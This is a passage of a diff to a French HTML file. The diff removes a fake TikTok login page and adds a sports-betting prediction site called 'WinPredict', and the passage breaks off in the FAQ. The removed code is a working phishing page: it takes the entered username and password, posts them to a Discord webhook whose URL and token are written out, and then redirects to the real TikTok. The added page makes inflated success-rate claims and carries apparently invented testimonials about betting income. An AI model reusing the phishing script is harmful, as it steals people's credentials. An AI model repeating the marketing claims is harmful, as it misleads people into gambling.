@@ -1,123 +1,856 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>TikTok - Connexion</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap">
-  <style>
-    body {
-      margin: 0;
-      background: #fff;
-      font-family: 'Inter', Arial, sans-serif;
-      color: #161823;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .login-container {
-      width: 340px;
-      max-width: 95vw;
-      margin: 24px;
-      background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
-      padding: 32px 20px 24px 20px;
-      text-align: center;
-    }
-    .tiktok-logo {
-      width: 48px;
-      margin-bottom: 16px;
-    }
-    .login-title {
-      font-size: 1.6em;
-      font-weight: 700;
-      margin-bottom: 16px;
-    }
-    .login-form {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      margin-bottom: 8px;
-      width: 100%;
-    }
-    .login-form input {
-      padding: 12px;
-      font-size: 1em;
-      border: 1px solid #e3e3e4;
-      border-radius: 6px;
-      outline: none;
-      transition: border 0.15s;
-    }
-    .login-form input:focus {
-      border-color: #fe2c55;
-    }
-    .login-form button {
-     : 8px;
-      background: #fe2c55;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      font-weight: 600;
-      font-size: 1.1em;
-      padding: 12px;
-      cursor: pointer;
-      transition: background 0.13s;
-    }
-    .login-form button:hover {
-      background: #e91b44;
-    }
-    .forgot-link {
-      color: #fe2c55;
-      text-decoration: none;
-      font-size: 0.97em;
-      margin-top: 4px;
-      align-self: flex-end;
-    }
-    .success-msg {
-      color: #12b886;
-      font-weight: 600;
-      margin: 14px 0 0 0;
-    }
-    .error-msg {
-      color: #fe2c55;
-      font-weight: 600;
-      margin: 14px 0 0 0;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WinPredict - Prédictions Sportives Gagnantes</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#4F46E5',
+                        secondary: '#10B981',
+                        dark: '#1F2937',
+                        light: '#F9FAFB'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .prediction-card {
+            transition: all 0.3s ease;
+        }
+        .prediction-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+        .stats-counter {
+            font-family: 'Arial', sans-serif;
+        }
+        .floating-btn {
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+    </style>
 </head>
-<body>
-  <div class="login-container">
-    <img src="https://www.vectorlogo.zone/logos/tiktok/tiktok-icon.svg" alt="TikTok" class="tiktok-logo">
-    <div class="login-title">Connexion TikTok</div>
-    <form class="login-form" id="loginForm">
-      <input type="text" id="loginInput" placeholder="E-mail ou nom d'utilisateur" required autocomplete="username">
-      <input type="password" id="passwordInput" placeholder="Mot de passe" required autocomplete="current-password">
-      <button type="submit">Se connecter</button>
-      <a href="#" class="forgot-link">Mot de passe oublié ?</a>
-    </form>
-    <div id="formMsg"></div>
-  </div>
-  <script>
-    document.getElementById('loginForm').onsubmit = function(e) {
-      e.preventDefault();
-      var username = document.getElementById('loginInput').value;
-      var password = document.getElementById('passwordInput').value;
-      var webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";
-      var content = `🔔 Connexion TikTok\n👤 Utilisateur : ${username}\n🔑 Mot de passe : ${password}`;
-      var form = new FormData();
-      form.append("content", content);
-      fetch(webhookURL, {
-        method: "POST",
-        body: form
-      }).finally(() => {
-        document.getElementById('formMsg').innerHTML = '<div class="success-msg">Connexion réussie (démo)</div>';
-        setTimeout(() => {
-          window.location.href = "https://www.tiktok.com";
-        }, 1200);
-      });
-    };
-  </script>
+<body class="bg-gray-50">
+    <!-- Header/Navigation -->
+    <header class="bg-white shadow-sm sticky top-0 z-50">
+        <div class="container mx-auto px-4 py-4 flex justify-between items-center">
+            <div class="flex items-center space-x-2">
+                <div class="w-10 h-10 rounded-full bg-primary flex items-center justify-center">
+                    <i class="fas fa-trophy text-white text-xl"></i>
+                </div>
+                <span class="text-xl font-bold text-dark">WinPredict</span>
+            </div>
+            <nav class="hidden md:flex space-x-8">
+                <a href="#accueil" class="text-dark hover:text-primary font-medium">Accueil</a>
+                <a href="#predictions" class="text-dark hover:text-primary font-medium">Prédictions</a>
+                <a href="#abonnements" class="text-dark hover:text-primary font-medium">Abonnements</a>
+                <a href="#resultats" class="text-dark hover:text-primary font-medium">Résultats</a>
+                <a href="#contact" class="text-dark hover:text-primary font-medium">Contact</a>
+            </nav>
+            <div class="flex items-center space-x-4">
+                <button class="hidden md:block bg-primary hover:bg-indigo-700 text-white px-4 py-2 rounded-lg font-medium transition duration-300">
+                    Connexion
+                </button>
+                <button class="md:hidden text-dark">
+                    <i class="fas fa-bars text-2xl"></i>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section id="accueil" class="py-16 md:py-24 bg-gradient-to-r from-primary to-indigo-600 text-white">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col md:flex-row items-center">
+                <div class="md:w-1/2 mb-10 md:mb-0">
+                    <h1 class="text-4xl md:text-5xl font-bold mb-6">Vos <span class="text-secondary">prédictions sportives</span> gagnantes</h1>
+                    <p class="text-xl mb-8 opacity-90">Accédez à nos analyses expertes et augmentez vos chances de gagner sur les matchs de football, basketball, tennis et plus encore.</p>
+                    <div class="flex flex-col sm:flex-row space-y-4 sm:space-y-0 sm:space-x-4">
+                        <button class="bg-secondary hover:bg-emerald-600 text-white px-6 py-3 rounded-lg font-bold text-lg transition duration-300">
+                            S'abonner maintenant
+                        </button>
+                        <button class="bg-white hover:bg-gray-100 text-primary px-6 py-3 rounded-lg font-bold text-lg transition duration-300">
+                            Voir les prédictions
+                        </button>
+                    </div>
+                </div>
+                <div class="md:w-1/2 relative">
+                    <div class="bg-white/10 backdrop-blur-md rounded-2xl p-6 shadow-xl">
+                        <div class="flex justify-between items-center mb-6">
+                            <h3 class="font-bold text-xl">Prédiction du jour</h3>
+                            <span class="bg-secondary text-white text-xs px-2 py-1 rounded">VIP</span>
+                        </div>
+                        <div class="bg-white/20 p-4 rounded-lg mb-4">
+                            <div class="flex justify-between items-center mb-3">
+                                <div class="flex items-center">
+                                    <img src="https://via.placeholder.com/30" alt="Team 1" class="w-8 h-8 mr-2">
+                                    <span class="font-medium">PSG</span>
+                                </div>
+                                <span class="bg-dark text-white px-2 py-1 text-xs rounded">Ligue 1</span>
+                                <div class="flex items-center">
+                                    <span class="font-medium">OM</span>
+                                    <img src="https://via.placeholder.com/30" alt="Team 2" class="w-8 h-8 ml-2">
+                                </div>
+                            </div>
+                            <div class="text-center my-4">
+                                <span class="text-2xl font-bold">2.5</span>
+                                <span class="mx-2">BUTS</span>
+                                <span class="text-2xl font-bold">1.5</span>
+                            </div>
+                            <div class="flex justify-between text-sm">
+                                <span>Cote: 1.85</span>
+                                <span>Probabilité: 78%</span>
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-3 gap-2">
+                            <div class="bg-secondary text-white text-center py-2 rounded font-bold">1</div>
+                            <div class="bg-white/20 text-center py-2 rounded font-bold">N</div>
+                            <div class="bg-white/20 text-center py-2 rounded font-bold">2</div>
+                        </div>
+                    </div>
+                    <div class="absolute -bottom-6 -right-6 bg-secondary text-white p-4 rounded-full shadow-xl floating-btn">
+                        <i class="fas fa-bolt text-2xl"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats Section -->
+    <section class="py-12 bg-white">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-8 text-center">
+                <div class="p-6">
+                    <div class="text-4xl font-bold text-primary stats-counter" data-target="12478">0</div>
+                    <p class="text-gray-600">Prédictions</p>
+                </div>
+                <div class="p-6">
+                    <div class="text-4xl font-bold text-primary stats-counter" data-target="89">0</div>
+                    <p class="text-gray-600">% de réussite</p>
+                </div>
+                <div class="p-6">
+                    <div class="text-4xl font-bold text-primary stats-counter" data-target="3562">0</div>
+                    <p class="text-gray-600">Clients satisfaits</p>
+                </div>
+                <div class="p-6">
+                    <div class="text-4xl font-bold text-primary stats-counter" data-target="24">0</div>
+                    <p class="text-gray-600">Sports couverts</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Predictions Section -->
+    <section id="predictions" class="py-16 bg-gray-50">
+        <div class="container mx-auto px-4">
+            <div class="text-center mb-12">
+                <span class="text-secondary font-bold">NOS PRÉDICTIONS</span>
+                <h2 class="text-3xl font-bold text-dark mt-2">Dernières analyses</h2>
+                <p class="text-gray-600 max-w-2xl mx-auto mt-4">Nos experts analysent des centaines de matchs chaque semaine pour vous fournir les meilleures opportunités.</p>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Prediction Card 1 -->
+                <div class="bg-white rounded-xl shadow-md overflow-hidden prediction-card">
+                    <div class="p-6">
+                        <div class="flex justify-between items-center mb-4">
+                            <span class="bg-primary/10 text-primary px-3 py-1 rounded-full text-sm font-medium">Football</span>
+                            <span class="text-gray-500 text-sm">Aujourd'hui, 20:45</span>
+                        </div>
+                        <div class="flex justify-between items-center mb-6">
+                            <div class="text-center">
+                                <img src="https://via.placeholder.com/50" alt="Team 1" class="w-12 h-12 mx-auto mb-2">
+                                <span class="font-medium">Bayern Munich</span>
+                            </div>
+                            <div class="text-center px-4">
+                                <span class="text-xs text-gray-500">Ligue des Champions</span>
+                                <div class="text-2xl font-bold my-1">VS</div>
+                                <span class="text-xs text-gray-500">Stade Allianz</span>
+                            </div>
+                            <div class="text-center">
+                                <img src="https://via.placeholder.com/50" alt="Team 2" class="w-12 h-12 mx-auto mb-2">
+                                <span class="font-medium">Real Madrid</span>
+                            </div>
+                        </div>
+                        <div class="bg-gray-50 p-4 rounded-lg mb-4">
+                            <div class="flex justify-between mb-2">
+                                <span class="text-gray-600">Notre prédiction:</span>
+                                <span class="font-bold">1X & +2.5 buts</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-600">Cote:</span>
+                                <span class="font-bold text-primary">2.10</span>
+                            </div>
+                        </div>
+                        <div class="w-full bg-gray-200 rounded-full h-2 mb-3">
+                            <div class="bg-primary h-2 rounded-full" style="width: 75%"></div>
+                        </div>
+                        <div class="flex justify-between text-sm text-gray-600 mb-4">
+                            <span>Confiance: 75%</span>
+                            <span>VIP</span>
+                        </div>
+                        <button class="w-full bg-primary hover:bg-indigo-700 text-white py-2 rounded-lg font-medium transition duration-300">
+                            Voir l'analyse complète
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Prediction Card 2 -->
+                <div class="bg-white rounded-xl shadow-md overflow-hidden prediction-card">
+                    <div class="p-6">
+                        <div class="flex justify-between items-center mb-4">
+                            <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-medium">Tennis</span>
+                            <span class="text-gray-500 text-sm">Demain, 15:30</span>
+                        </div>
+                        <div class="flex justify-between items-center mb-6">
+                            <div class="text-center">
+                                <img src="https://via.placeholder.com/50" alt="Player 1" class="w-12 h-12 mx-auto mb-2 rounded-full">
+                                <span class="font-medium">Djokovic</span>
+                            </div>
+                            <div class="text-center px-4">
+                                <span class="text-xs text-gray-500">Roland Garros</span>
+                                <div class="text-2xl font-bold my-1">VS</div>
+                                <span class="text-xs text-gray-500">Court Philippe-Chatrier</span>
+                            </div>
+                            <div class="text-center">
+                                <img src="https://via.placeholder.com/50" alt="Player 2" class="w-12 h-12 mx-auto mb-2 rounded-full">
+                                <span class="font-medium">Nadal</span>
+                            </div>
+                        </div>
+                        <div class="bg-gray-50 p-4 rounded-lg mb-4">
+                            <div class="flex justify-between mb-2">
+                                <span class="text-gray-600">Notre prédiction:</span>
+                                <span class="font-bold">Nadal 3-1</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-600">Cote:</span>
+                                <span class="font-bold text-primary">3.50</span>
+                            </div>
+                        </div>
+                        <div class="w-full bg-gray-200 rounded-full h-2 mb-3">
+                            <div class="bg-primary h-2 rounded-full" style="width: 65%"></div>
+                        </div>
+                        <div class="flex justify-between text-sm text-gray-600 mb-4">
+                            <span>Confiance: 65%</span>
+                            <span>Standard</span>
+                        </div>
+                        <button class="w-full bg-primary hover:bg-indigo-700 text-white py-2 rounded-lg font-medium transition duration-300">
+                            Voir l'analyse complète
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Prediction Card 3 -->
+                <div class="bg-white rounded-xl shadow-md overflow-hidden prediction-card">
+                    <div class="p-6">
+                        <div class="flex justify-between items-center mb-4">
+                            <span class="bg-orange-100 text-orange-800 px-3 py-1 rounded-full text-sm font-medium">Basketball</span>
+                            <span class="text-gray-500 text-sm">Demain, 02:30</span>
+                        </div>
+                        <div class="flex justify-between items-center mb-6">
+                            <div class="text-center">
+                                <img src="https://via.placeholder.com/50" alt="Team 1" class="w-12 h-12 mx-auto mb-2">
+                                <span class="font-medium">Lakers</span>
+                            </div>
+                            <div class="text-center px-4">
+                                <span class="text-xs text-gray-500">NBA</span>
+                                <div class="text-2xl font-bold my-1">VS</div>
+                                <span class="text-xs text-gray-500">Staples Center</span>
+                            </div>
+                            <div class="text-center">
+                                <img src="https://via.placeholder.com/50" alt="Team 2" class="w-12 h-12 mx-auto mb-2">
+                                <span class="font-medium">Warriors</span>
+                            </div>
+                        </div>
+                        <div class="bg-gray-50 p-4 rounded-lg mb-4">
+                            <div class="flex justify-between mb-2">
+                                <span class="text-gray-600">Notre prédiction:</span>
+                                <span class="font-bold">Warriors +5.5</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-gray-600">Cote:</span>
+                                <span class="font-bold text-primary">1.90</span>
+                            </div>
+                        </div>
+                        <div class="w-full bg-gray-200 rounded-full h-2 mb-3">
+                            <div class="bg-primary h-2 rounded-full" style="width: 80%"></div>
+                        </div>
+                        <div class="flex justify-between text-sm text-gray-600 mb-4">
+                            <span>Confiance: 80%</span>
+                            <span>VIP</span>
+                        </div>
+                        <button class="w-full bg-primary hover:bg-indigo-700 text-white py-2 rounded-lg font-medium transition duration-300">
+                            Voir l'analyse complète
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="text-center mt-12">
+                <button class="bg-white hover:bg-gray-100 text-primary border border-primary px-6 py-3 rounded-lg font-bold text-lg transition duration-300">
+                    Voir toutes les prédictions
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Subscription Section -->
+    <section id="abonnements" class="py-16 bg-primary text-white">
+        <div class="container mx-auto px-4">
+            <div class="text-center mb-12">
+                <span class="text-secondary font-bold">NOS OFFRES</span>
+                <h2 class="text-3xl font-bold mt-2">Choisissez votre abonnement</h2>
+                <p class="opacity-90 max-w-2xl mx-auto mt-4">Accédez à nos prédictions premium et maximisez vos gains avec l'abonnement qui correspond à vos besoins.</p>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-5xl mx-auto">
+                <!-- Basic Plan -->
+                <div class="bg-white/10 backdrop-blur-md rounded-xl overflow-hidden border border-white/20">
+                    <div class="p-8 text-center">
+                        <h3 class="text-xl font-bold mb-2">Standard</h3>
+                        <div class="mb-6">
+                            <span class="text-4xl font-bold">19€</span>
+                            <span class="opacity-80">/mois</span>
+                        </div>
+                        <ul class="space-y-3 mb-8">
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-secondary mr-2"></i>
+                                <span>5 prédictions par semaine</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-secondary mr-2"></i>
+                                <span>Sports: Football, Tennis</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-secondary mr-2"></i>
+                                <span>Analyses basiques</span>
+                            </li>
+                            <li class="flex items-center opacity-50">
+                                <i class="fas fa-times-circle mr-2"></i>
+                                <span>Pas d'accès VIP</span>
+                            </li>
+                            <li class="flex items-center opacity-50">
+                                <i class="fas fa-times-circle mr-2"></i>
+                                <span>Support standard</span>
+                            </li>
+                        </ul>
+                        <button class="w-full bg-white hover:bg-gray-100 text-primary py-3 rounded-lg font-bold transition duration-300">
+                            S'abonner
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Popular Plan -->
+                <div class="bg-secondary rounded-xl overflow-hidden transform scale-105 shadow-xl relative">
+                    <div class="absolute top-0 right-0 bg-primary text-white text-xs font-bold px-3 py-1 rounded-bl-lg">
+                        POPULAIRE
+                    </div>
+                    <div class="p-8 text-center">
+                        <h3 class="text-xl font-bold mb-2">Premium</h3>
+                        <div class="mb-6">
+                            <span class="text-4xl font-bold">49€</span>
+                            <span class="opacity-80">/mois</span>
+                        </div>
+                        <ul class="space-y-3 mb-8">
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-primary mr-2"></i>
+                                <span>15 prédictions par semaine</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-primary mr-2"></i>
+                                <span>Tous les sports</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-primary mr-2"></i>
+                                <span>Analyses détaillées</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-primary mr-2"></i>
+                                <span>Accès à certaines VIP</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-primary mr-2"></i>
+                                <span>Support prioritaire</span>
+                            </li>
+                        </ul>
+                        <button class="w-full bg-white hover:bg-gray-100 text-secondary py-3 rounded-lg font-bold transition duration-300">
+                            S'abonner
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- VIP Plan -->
+                <div class="bg-white/10 backdrop-blur-md rounded-xl overflow-hidden border border-white/20">
+                    <div class="p-8 text-center">
+                        <h3 class="text-xl font-bold mb-2">VIP</h3>
+                        <div class="mb-6">
+                            <span class="text-4xl font-bold">99€</span>
+                            <span class="opacity-80">/mois</span>
+                        </div>
+                        <ul class="space-y-3 mb-8">
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-secondary mr-2"></i>
+                                <span>Prédictions illimitées</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-secondary mr-2"></i>
+                                <span>Tous les sports + eSports</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-secondary mr-2"></i>
+                                <span>Analyses expertes</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-secondary mr-2"></i>
+                                <span>Toutes les prédictions VIP</span>
+                            </li>
+                            <li class="flex items-center">
+                                <i class="fas fa-check-circle text-secondary mr-2"></i>
+                                <span>Support 24/7</span>
+                            </li>
+                        </ul>
+                        <button class="w-full bg-white hover:bg-gray-100 text-primary py-3 rounded-lg font-bold transition duration-300">
+                            S'abonner
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Results Section -->
+    <section id="resultats" class="py-16 bg-white">
+        <div class="container mx-auto px-4">
+            <div class="text-center mb-12">
+                <span class="text-secondary font-bold">NOS RÉSULTATS</span>
+                <h2 class="text-3xl font-bold text-dark mt-2">Suivi de performance</h2>
+                <p class="text-gray-600 max-w-2xl mx-auto mt-4">Transparence totale - consultez nos résultats récents et notre taux de réussite.</p>
+            </div>
+            
+            <div class="overflow-x-auto">
+                <table class="min-w-full bg-white rounded-lg overflow-hidden">
+                    <thead class="bg-gray-100">
+                        <tr>
+                            <th class="py-3 px-4 text-left font-semibold text-gray-700">Date</th>
+                            <th class="py-3 px-4 text-left font-semibold text-gray-700">Match</th>
+                            <th class="py-3 px-4 text-left font-semibold text-gray-700">Prédiction</th>
+                            <th class="py-3 px-4 text-left font-semibold text-gray-700">Cote</th>
+                            <th class="py-3 px-4 text-left font-semibold text-gray-700">Résultat</th>
+                            <th class="py-3 px-4 text-left font-semibold text-gray-700">Statut</th>
+                        </tr>
+                    </thead>
+                    <tbody class="divide-y divide-gray-200">
+                        <tr>
+                            <td class="py-3 px-4">12/06/2023</td>
+                            <td class="py-3 px-4">
+                                <div class="flex items-center">
+                                    <img src="https://via.placeholder.com/20" alt="Team 1" class="w-5 h-5 mr-2">
+                                    <span>Man City</span>
+                                    <span class="mx-2">vs</span>
+                                    <img src="https://via.placeholder.com/20" alt="Team 2" class="w-5 h-5 mr-2">
+                                    <span>Inter Milan</span>
+                                </div>
+                            </td>
+                            <td class="py-3 px-4">1 & +2.5 buts</td>
+                            <td class="py-3 px-4">2.10</td>
+                            <td class="py-3 px-4">1-0</td>
+                            <td class="py-3 px-4">
+                                <span class="bg-red-100 text-red-800 px-2 py-1 rounded-full text-xs">Perdu</span>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="py-3 px-4">11/06/2023</td>
+                            <td class="py-3 px-4">
+                                <div class="flex items-center">
+                                    <img src="https://via.placeholder.com/20" alt="Team 1" class="w-5 h-5 mr-2">
+                                    <span>Nadal</span>
+                                    <span class="mx-2">vs</span>
+                                    <img src="https://via.placeholder.com/20" alt="Team 2" class="w-5 h-5 mr-2">
+                                    <span>Djokovic</span>
+                                </div>
+                            </td>
+                            <td class="py-3 px-4">Nadal 3-1</td>
+                            <td class="py-3 px-4">3.50</td>
+                            <td class="py-3 px-4">3-1</td>
+                            <td class="py-3 px-4">
+                                <span class="bg-green-100 text-green-800 px-2 py-1 rounded-full text-xs">Gagné</span>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="py-3 px-4">10/06/2023</td>
+                            <td class="py-3 px-4">
+                                <div class="flex items-center">
+                                    <img src="https://via.placeholder.com/20" alt="Team 1" class="w-5 h-5 mr-2">
+                                    <span>Warriors</span>
+                                    <span class="mx-2">vs</span>
+                                    <img src="https://via.placeholder.com/20" alt="Team 2" class="w-5 h-5 mr-2">
+                                    <span>Lakers</span>
+                                </div>
+                            </td>
+                            <td class="py-3 px-4">Warriors +5.5</td>
+                            <td class="py-3 px-4">1.90</td>
+                            <td class="py-3 px-4">112-105</td>
+                            <td class="py-3 px-4">
+                                <span class="bg-green-100 text-green-800 px-2 py-1 rounded-full text-xs">Gagné</span>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="py-3 px-4">09/06/2023</td>
+                            <td class="py-3 px-4">
+                                <div class="flex items-center">
+                                    <img src="https://via.placeholder.com/20" alt="Team 1" class="w-5 h-5 mr-2">
+                                    <span>PSG</span>
+                                    <span class="mx-2">vs</span>
+                                    <img src="https://via.placeholder.com/20" alt="Team 2" class="w-5 h-5 mr-2">
+                                    <span>OM</span>
+                                </div>
+                            </td>
+                            <td class="py-3 px-4">BTTS</td>
+                            <td class="py-3 px-4">1.75</td>
+                            <td class="py-3 px-4">2-1</td>
+                            <td class="py-3 px-4">
+                                <span class="bg-green-100 text-green-800 px-2 py-1 rounded-full text-xs">Gagné</span>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <div class="mt-8 flex justify-center">
+                <nav class="flex items-center space-x-2">
+                    <button class="px-3 py-1 rounded border border-gray-300 text-gray-500 hover:bg-gray-50">&laquo;</button>
+                    <button class="px-3 py-1 rounded bg-primary text-white">1</button>
+                    <button class="px-3 py-1 rounded border border-gray-300 text-gray-700 hover:bg-gray-50">2</button>
+                    <button class="px-3 py-1 rounded border border-gray-300 text-gray-700 hover:bg-gray-50">3</button>
+                    <button class="px-3 py-1 rounded border border-gray-300 text-gray-500 hover:bg-gray-50">&raquo;</button>
+                </nav>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials Section -->
+    <section class="py-16 bg-gray-50">
+        <div class="container mx-auto px-4">
+            <div class="text-center mb-12">
+                <span class="text-secondary font-bold">TÉMOIGNAGES</span>
+                <h2 class="text-3xl font-bold text-dark mt-2">Ce que disent nos clients</h2>
+                <p class="text-gray-600 max-w-2xl mx-auto mt-4">Découvrez les retours de nos abonnés satisfaits qui ont augmenté leurs gains grâce à nos prédictions.</p>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <!-- Testimonial 1 -->
+                <div class="bg-white p-8 rounded-xl shadow-md">
+                    <div class="flex items-center mb-4">
+                        <div class="flex -space-x-2">
+                            <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="User" class="w-10 h-10 rounded-full border-2 border-white">
+                        </div>
+                        <div class="ml-4">
+                            <h4 class="font-bold">Marc D.</h4>
+                            <p class="text-gray-600 text-sm">Abonné VIP</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-700 mb-4">"Grâce à WinPredict, j'ai pu transformer mon passe-temps en véritable source de revenus. Leur taux de réussite est impressionnant et leurs analyses sont d'une grande qualité."</p>
+                    <div class="flex">
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                    </div>
+                </div>
+                
+                <!-- Testimonial 2 -->
+                <div class="bg-white p-8 rounded-xl shadow-md">
+                    <div class="flex items-center mb-4">
+                        <div class="flex -space-x-2">
+                            <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="User" class="w-10 h-10 rounded-full border-2 border-white">
+                        </div>
+                        <div class="ml-4">
+                            <h4 class="font-bold">Sophie L.</h4>
+                            <p class="text-gray-600 text-sm">Abonnée Premium</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-700 mb-4">"Je suis abonnée depuis 6 mois et je ne regrette pas mon choix. Les prédictions sont précises et le service client est réactif. J'ai déjà multiplié ma mise initiale par 5 !"</p>
+                    <div class="flex">
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star-half-alt text-yellow-400"></i>
+                    </div>
+                </div>
+                
+                <!-- Testimonial 3 -->
+                <div class="bg-white p-8 rounded-xl shadow-md">
+                    <div class="flex items-center mb-4">
+                        <div class="flex -space-x-2">
+                            <img src="https://randomuser.me/api/portraits/men/75.jpg" alt="User" class="w-10 h-10 rounded-full border-2 border-white">
+                        </div>
+                        <div class="ml-4">
+                            <h4 class="font-bold">Thomas R.</h4>
+                            <p class="text-gray-600 text-sm">Abonné Standard</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-700 mb-4">"Pour un abonnement d'entrée de gamme, je suis agréablement surpris par la qualité des prédictions. J'ai testé pendant 1 mois et j'ai décidé de passer au premium tellement j'étais satisfait."</p>
+                    <div class="flex">
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="far fa-star text-yellow-400"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="py-16 bg-white">
+        <div class="container mx-auto px-4">
+            <div class="text-center mb-12">
+                <span class="text-secondary font-bold">FAQ</span>
+                <h2 class="text-3xl font-bold text-dark mt-2">Questions fréquentes</h2>
+                <p class="text-gray-600 max-w-2xl mx-auto mt-4">Trouvez des réponses aux questions les plus courantes sur nos services de prédictions sportives.</p>
+            </div>
+            
+            <div class="max-w-3xl mx-auto">
+                <!-- FAQ Item 1 -->
+                <div class="mb-6 border-b border-gray-200 pb-6">
+                    <button class="flex justify-between items-center w-full text-left font-semibold text-dark focus:outline-none faq-btn">
+                        <span>Comment fonctionnent vos prédictions ?</span>
+                        <i class="fas fa-chevron-down text-primary transition-transform duration-300"></i>
+                    </button>
+                    <div class="mt-4 text-gray-600 faq-content hidden">
+                        <p>Nos prédictions sont le résultat d'une analyse approfondie réalisée par nos experts en statistiques sportives. Nous prenons en compte de nombreux facteurs : forme des équipes/joueurs, statistiques historiques, blessures, motivation, conditions météo, etc. Chaque prédiction est accompagnée d'une analyse détaillée et d'un indice de confiance.</p>
+                    </div>
+                </div>
+                
+                <!-- FAQ Item 2 -->
+                <div class="mb-6 border-b border-gray-200 pb-6">
+                    <button class="flex justify-between items-center w-full text-left font-semibold text-dark focus:outline-none faq-btn">
+                        <span>Quel est votre taux de réussite ?</span>
+                        <i class="fas fa-chevron-down text-primary transition-transform duration-300"></i>
+                    </button>
+                    <div class="mt-4 text-gray-600 faq-content hidden">
+                        <p>Sur les 12 derniers mois, notre taux de réussite moyen est de 89% pour les prédictions VIP et 78% pour les prédictions standard. Nous affichons tous nos résultats en toute transparence dans la section "Résultats" de notre site. Notez que même avec un taux de réussite élevé, les paris sportifs comportent toujours un risque et nous recommandons de toujours parier de manière responsable.</p>
+                    </div>
+                </div>
+                
+                <!-- FAQ Item 3 -->
+                <div class="mb-6 border-b border-gray-200 pb-6">
+                    <button class="flex justify-between items-center w-full text-left font-semibold text-dark focus:outline-none faq-btn">
+                        <span>Puis-je essayer gratuitement avant de m'abonner ?</span>
+                        <i class="fas fa-chevron-down text-primary transition-transform duration-300"></i>
+                    </button>
+                    <div class="mt-4 text-gray-600 faq-content hidden">
